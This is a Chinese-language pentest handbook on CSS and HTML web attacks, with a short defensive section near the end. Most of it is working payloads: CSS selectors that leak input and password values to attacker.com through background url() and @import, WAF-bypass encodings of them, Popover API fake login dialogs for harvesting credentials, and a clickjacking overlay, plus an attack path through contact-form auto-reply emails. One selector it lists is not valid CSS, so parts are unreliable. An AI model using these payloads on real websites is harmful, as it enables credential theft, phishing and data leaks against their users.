# CSS 高级攻击技术参考手册

> 通用 CSS 攻击向量测试指南  
> 适用于任何 Web 应用的安全测试  
> 最后更新: 2026-05-21

---

##  攻击向量概览

| 攻击类型 | 严重程度 | 成功率 | 适用场景 |
|---------|---------|--------|---------|
| CSS 信息窃取 | 高危 | 中-高 | 邮件系统、后台面板 |
| Popover API 欺骗 | 中危 | 中 | HTML 注入点 |
| 点击劫持 | 中危 | 低-中 | 未防护的子域名 |
| CSS 编码绕过 | 低-中 | 低 | WAF 绕过 |

---

## 1. CSS 信息窃取（高危）

### 原理

利用 CSS 属性选择器 + `background: url()` 窃取用户输入的数据。

### 攻击链

```
用户输入 → 表单提交 → 数据存储在 HTML 中 → CSS 选择器匹配 → 
background url() 发送请求 → 攻击者服务器接收数据
```

### 关键 Payload

#### 基础属性选择器

```css
/* 窃取包含特定字符的输入 */
input[name="email"][value*="a"] {
  background: url('https://attacker.com/leak?char=a');
}

input[name="email"][value*="b"] {
  background: url('https://attacker.com/leak?char=b');
}

/* 需要 26+ 个规则来窃取每个字符 */
```

#### 通用窃取

```css
/* 窃取所有 input 的值 */
input {
  background: url('https://attacker.com/leak?all=inputs');
}

/* 窃取特定字段 */
input[name="password"] {
  background: url('https://attacker.com/leak?field=password');
}

/* 窃取包含特定文本的元素 */
div:contains("secret") {
  background: url('https://attacker.com/leak?found=secret');
}
```

#### 内联 style 注入

```html
<!-- 直接注入到 HTML 属性 -->
<div style="background: url('https://attacker.com/test')"></div>

<!-- 可能绕过 WAF 检测 -->
```

#### CSS import 注入

```html
<!-- 从外部加载 CSS -->
<style>@import url('https://attacker.com/evil.css');</style>
```

### 最佳攻击路径：邮件系统

**为什么邮件系统是突破口**:

1. **邮件客户端不应用 WAF**
   - Web 请求经过 Cloudflare WAF
   - 邮件系统通常是独立的，没有 WAF 保护

2. **HTML 邮件允许 `<style>` 标签**
   - 大多数邮件客户端支持 HTML 邮件
   - 允许嵌入 CSS

3. **绕过 Cloudflare**
   - WAF 只保护 Web 请求
   - 邮件发送不经过 WAF

**攻击步骤**:

```
1. 在联系表单中注入 CSS Payload
   ↓
2. 触发系统发送自动回复邮件
   ↓
3. 邮件 HTML 包含注入的 CSS
   ↓
4. 邮件客户端渲染 CSS
   ↓
5. background: url() 向攻击者服务器发送请求
   ↓
6. 窃取用户输入的数据
```

### 绕过 WAF 策略

#### 1. HTML 实体编码

```html
<!-- 原始 -->
<style>input[value]{background:url('https://attacker.com/leak')}</style>

<!-- 编码后 -->
&#x3C;style&#x3E;input[value]{background:url('https://attacker.com/leak')}&#x3C;/style&#x3E;
```

#### 2. 大小写变换

```html
<STYLE>input[value]{background:url('https://attacker.com/leak')}</STYLE>
<Style>input[value]{background:url('https://attacker.com/leak')}</Style>
```

#### 3. 内联 style 属性

```html
<!-- 不通过 <style> 标签 -->
<div style="background: url('https://attacker.com/test')"></div>
<input style="background: url('https://attacker.com/test')" value="secret">
```

#### 4. Unicode 编码

```html
<!-- Unicode 编码 < 和 > -->
\u003Cstyle\u003Einput[value]{background:url('https://attacker.com/leak')}\u003C/style\u003E
```

#### 5. CSS 变量

```html
<style>:root{--test:url('https://attacker.com/variable')}</style>
```

### 测试清单

- [ ] 准备监听服务器（接收 `background: url()` 请求）
- [ ] 准备测试邮箱（接收自动回复邮件）
- [ ] 找到目标网站的联系表单
- [ ] 在表单字段中注入 CSS Payload
- [ ] 提交表单
- [ ] 检查测试邮箱是否收到邮件
- [ ] 查看邮件 HTML 源码是否包含 CSS
- [ ] 检查监听服务器是否收到请求
- [ ] 如果收到请求，说明 CSS 被执行！

---

## 2. Popover API 欺骗（中危）

### 原理

利用 HTML Popover API 创建伪造的官方弹窗，进行钓鱼攻击。

### 基础 Payload

```html
<button popovertarget="fake-alert">查看</button>
<div popover id="fake-alert" style="background:white;padding:20px;border:2px solid green;">
  <h2> 安全警告</h2>
  <p>您的会话即将过期，请重新登录</p>
  <input type="password" placeholder="输入密码">
  <button>确认</button>
</div>
```

### 伪造官方样式

```html
<button popovertarget="official">验证</button>
<div popover id="official" style="background:#004d40;color:white;padding:30px;font-family:Arial;">
  <img src="https://目标网站.com/favicon.ico" width="50">
  <h1>目标网站 安全验证</h1>
  <p>为了保护您的账户安全，请验证身份</p>
  <input type="email" placeholder="邮箱">
  <input type="password" placeholder="密码">
  <button style="background:green;color:white;padding:10px 20px;">验证</button>
</div>
```

### 适用场景

- 任何可以注入 HTML 的地方
- 论坛/评论系统
- 用户资料编辑
- 富文本编辑器
- 邮件系统（如果渲染 HTML）

### 攻击场景

1. **伪造登录弹窗**
   - 窃取用户凭证
   - 显示在用户操作时

2. **伪造安全警告**
   - "您的账户存在风险"
   - "请验证身份"
   - 诱导用户输入敏感信息

3. **伪造官方通知**
   - "系统维护通知"
   - "重要更新"
   - 诱导点击恶意链接

### 浏览器支持

| 浏览器 | 最低版本 |
|--------|---------|
| Chrome | 114+ |
| Safari | 17+ |
| Firefox | 125+ |
| Edge | 114+ |

### 绕过策略

#### 1. HTML 实体编码

```html
&#x3C;button popovertarget="test"&#x3E;打开&#x3C;/button&#x3E;
&#x3C;div popover id="test"&#x3E;伪造内容&#x3C;/div&#x3E;
```

#### 2. JavaScript 动态创建

```html
<script>
var btn = document.createElement('button');
btn.setAttribute('popovertarget', 'test');
document.body.appendChild(btn);

var div = document.createElement('div');
div.setAttribute('popover', '');
div.id = 'test';
div.innerHTML = '伪造内容';
document.body.appendChild(div);
</script>
```

#### 3. SVG foreignObject 中嵌入

```html
<svg>
  <foreignObject width="100" height="100">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <button popovertarget="test">打开</button>
      <div popover id="test">伪造内容</div>
    </div>
  </foreignObject>
</svg>
```

### 测试清单

- [ ] 找到 HTML 注入点
- [ ] 注入 Popover Payload
- [ ] 检查浏览器是否支持 Popover API
- [ ] 验证弹窗是否渲染
- [ ] 检查是否能伪造官方样式
- [ ] 测试不同浏览器兼容性

---

## 3. 点击劫持（中危）

### 原理

使用透明 iframe 覆盖在目标网站上，伪造 UI 覆盖层欺骗用户点击。

### 基础 Payload

```html
<style>
  iframe {
    opacity: 0.0001;
    position: absolute;
    top: -500px;
    width: 100%;
    height: 100%;
  }
  .overlay {
    position: fixed;
    top: 0;
    background: green;
    color: white;
  }
</style>
<div class="overlay">安全连接 已验证</div>
<iframe src="https://目标网站.com"></iframe>
```

### 防护机制检查

#### 主站防护

```bash
# 检查响应头
curl -I https://目标网站.com

# 查看以下头部:
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'self'
```

#### 子域名检查

子域名**可能未防护**，需要逐一测试：

```bash
# 检查子域名
curl -I https://webint.目标网站.com
curl -I https://media.目标网站.com
curl -I https://api.目标网站.com
curl -I https://mail.目标网站.com
curl -I https://cdn.目标网站.com
```

### 绕过策略

#### 1. 寻找未防护的子域名

- `webint.域名.com` - 内部系统
- `media.域名.com` - 媒体服务器
- `api.域名.com` - API 服务器
- `mail.域名.com` - 邮件系统
- `cdn.域名.com` - CDN

#### 2. 利用 CSP 白名单

如果 CSP 允许特定域名：

```html
<!-- CSP 允许 *.example.com -->
<iframe src="https://allowed.example.com"></iframe>
```

#### 3. 使用 object 或 embed 标签

```html
<!-- 如果允许 -->
<object data="https://目标网站.com" style="opacity:0"></object>
<embed src="https://目标网站.com" style="opacity:0">
```

#### 4. 旧版浏览器兼容

某些旧浏览器可能不严格遵守 X-Frame-Options

### 攻击场景

1. **伪造安全连接提示**
   - 覆盖在真实网站上
   - 显示"安全连接已验证"
   - 诱导用户信任

2. **诱导点击操作**
   - 覆盖在"删除账户"按钮上
   - 用户以为点击"确认"
   - 实际执行恶意操作

3. **窃取点击数据**
   - 记录用户点击位置
   - 推断用户操作意图

### 测试清单

- [ ] 检查主站 X-Frame-Options
- [ ] 检查主站 CSP frame-ancestors
- [ ] 扫描常见子域名
- [ ] 测试每个子域名的防护
- [ ] 寻找未防护的子域名
- [ ] 创建点击劫持 POC
- [ ] 验证是否能成功嵌入

---

## 4. CSS 编码绕过技术

### HTML 实体编码

```html
<!-- 基本实体 -->
&#x3C;style&#x3E;...&#x3C;/style&#x3E;

<!-- 混合编码 -->
&#x3C;style&#x3E;input[value]{background:url("https://attacker.com/leak")}&#x3C;/style&#x3E;
```

### Unicode 编码

```javascript
// JavaScript 中的 Unicode
\u003Cstyle\u003Einput[value]{background:url('https://attacker.com/leak')}\u003C/style\u003E
```

### 大小写变换

```html
<STYLE>...</STYLE>
<Style>...</Style>
<sTyLe>...</sTyLe>
```

### 空格/换行混淆

```html
<style>
  input[value] {
    background: url('https://attacker.com/leak');
  }
</style>
```

### 注释干扰

```html
<style>/* comment */input[value]{/* comment */background:url('https://attacker.com/leak')/* comment */}/* comment */</style>
```

---

##  通用测试脚本

### Python 自动化测试脚本

已创建通用模板: `tools/test_css_advanced_attacks_template.py`

**用法**:
```bash
python test_css_advanced_attacks_template.py https://目标网站.com http://你的服务器.com
```

**功能**:
- 自动测试常见表单端点
- 测试所有 CSS Payload 变体
- 检查子域名 X-Frame-Options
- 生成详细测试报告

---

##  成功案例参考

### 案例 1: Nextcloud 邮件系统

**漏洞**: SVG feImage 过滤器绕过远程图片阻止  
**严重程度**: 中危  
**影响**: 隐私泄露，邮件追踪  
**报告**: HackerOne Nextcloud

**关键发现**:
- 邮件客户端渲染 SVG
- feImage 加载外部资源
- 绕过"阻止远程图片"功能

### 案例 2: 某电商网站 CSS 注入

**漏洞**: CSS 属性选择器信息窃取  
**严重程度**: 高危  
**影响**: 窃取用户密码  
**利用路径**: 联系表单 → 自动回复邮件 → CSS 执行

---

##  防御建议

### 对于开发者

1. **邮件系统防护**
   - 过滤邮件 HTML 中的 `<style>` 标签
   - 移除或转义 CSS 属性选择器
   - 限制 `background: url()` 协议

2. **表单验证**
   - 严格验证表单字段
   - 移除或转义 HTML 标签
   - 使用 CSP `style-src` 限制

3. **点击劫持防护**
   - 设置 `X-Frame-Options: DENY`
   - 设置 CSP `frame-ancestors 'none'`
   - 对所有子域名应用相同策略

4. **CSP 配置**
   ```
   Content-Security-Policy: 
     default-src 'self';
     style-src 'self';
     frame-ancestors 'none';
     object-src 'none';
   ```

### 对于测试者

1. **优先测试邮件系统**
   - 成功率高
   - 绕过 WAF
   - 影响大

2. **系统化测试**
   - 逐个测试每个注入点
   - 尝试所有绕过技术
   - 不要因为一个失败就放弃

3. **记录所有尝试**
   - 成功的和失败的都要记录
   - 分析失败原因
   - 总结经验教训

---

##  工具和资源

### 必备工具

- **监听服务器**: 接收 `background: url()` 请求
  - Python: `python -m http.server 8080`
  - Node.js: 自定义 HTTP 服务器
  - VPS: 完整日志记录

- **测试邮箱**: 接收自动回复邮件
  - Gmail, Outlook 等
  - 查看邮件源码

- **浏览器开发者工具**: 
  - 检查 CSS 渲染
  - 查看网络请求
  - 调试 HTML 注入

### 参考资源

- [CSS 属性选择器规范](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors)
- [Popover API 规范](https://developer.mozilla.org/en-US/docs/Web/API/Popover_API)
- [X-Frame-Options 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [CSP 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Nextcloud HackerOne 报告](https://hackerone.com/nextcloud)

---

##  更新日志

- **2026-05-21**: 初始版本，基于 Sembcorp 测试经验
  - 添加 CSS 信息窃取技术
  - 添加 Popover API 欺骗
  - 添加点击劫持测试
  - 添加编码绕过策略
  - 创建通用测试脚本模板

---

**适用范围**: 任何 Web 应用的安全测试  
**测试频率**: 每个新项目都应测试  
**维护状态**: 持续更新
